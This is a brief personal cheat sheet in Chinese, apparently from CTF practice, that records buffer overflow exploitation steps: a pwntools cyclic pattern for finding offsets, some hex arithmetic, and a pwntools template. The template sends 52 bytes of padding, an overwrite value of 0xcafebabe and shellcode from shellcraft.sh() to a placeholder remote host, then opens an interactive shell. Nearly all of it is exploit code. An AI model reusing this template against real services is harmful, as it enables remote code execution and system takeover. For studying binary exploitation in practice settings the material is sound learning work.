### Record some expolit of  payload.
因常常忘記...於是紀錄一下各種解題方法。

試bof字串：

```
>>> cyclic(52)

'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa'

>>> hex(0x21DD09EC - 0x10101010)

'0x11ccf9dc'

echo $((0x48-0x14))

52
```

#### pwntools起手式

```
from pwn import *

<font color="red"># 0xcafebabe<font>

r = remote('ip', 'port')

shell = asm(shellcraft.sh())

buf = p32(0xcafebabe)

payload = "A"*52

payload += buf

payload += shell

r.sendline(payload)

r.interactive()
```
